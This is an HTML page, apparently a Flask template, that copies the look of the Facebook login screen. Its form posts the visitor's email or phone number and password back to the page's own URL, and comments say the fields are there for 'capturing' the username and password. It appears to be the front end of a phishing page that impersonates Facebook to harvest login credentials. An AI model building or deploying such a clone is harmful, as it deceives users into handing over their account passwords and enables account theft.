<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Facebook Login</title>
    <!-- Use a proper static link or remove if inline styles are enough -->
    <!-- <link rel="stylesheet" href="{{ url_for('static', filename='css/facebook.css') }}"> -->
    <style>
        /* Your inline CSS styles here */
        body {
            font-family: Arial, sans-serif;
            background-color: #f0f2f5;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .container {
            width: 100%;
            max-width: 400px;
            padding: 20px;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
            background-color: #fff;
            border-radius: 8px;
        }
        .login-box h2 {
            text-align: center;
            color: #1877f2;
            margin-bottom: 20px;
        }
        .input-box {
            margin-bottom: 20px;
        }
        .input-box input {
            width: 100%;
            padding: 10px;
            border: 1px solid #ddd;
            border-radius: 4px;
            font-size: 16px;
        }
        button {
            width: 100%;
            padding: 10px;
            background-color: #1877f2;
            border: none;
            border-radius: 4px;
            color: #fff;
            font-size: 16px;
            cursor: pointer;
        }
        button:hover {
            background-color: #166fe5;
        }
        a {
            display: block;
            text-align: center;
            color: #1877f2;
            margin-top: 10px;
            text-decoration: none;
        }
        hr {
            border: 0;
            border-top: 1px solid #ddd;
            margin: 20px 0;
        }
        .create-account {
            background-color: #42b72a;
        }
        .create-account:hover {
            background-color: #36a420;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="login-box">
            <h2>Facebook</h2>
            <!-- Add method and proper action. If action is empty, form submits to the same URL -->
            <form method="post" action="">
                <div class="input-box">
                    <!-- Add name attribute for capturing the username -->
                    <input type="text" name="username" placeholder="Email address or phone number" required>
                </div>
                <div class="input-box">
                    <!-- Add name attribute for capturing the password -->
                    <input type="password" name="password" placeholder="Password" required>
                </div>
                <button type="submit">Log In</button>
                <a href="#">Forgot account?</a>
                <hr>
                <button type="button" class="create-account">Create New Account</button>
            </form>
        </div>
    </div>
</body>
</html>
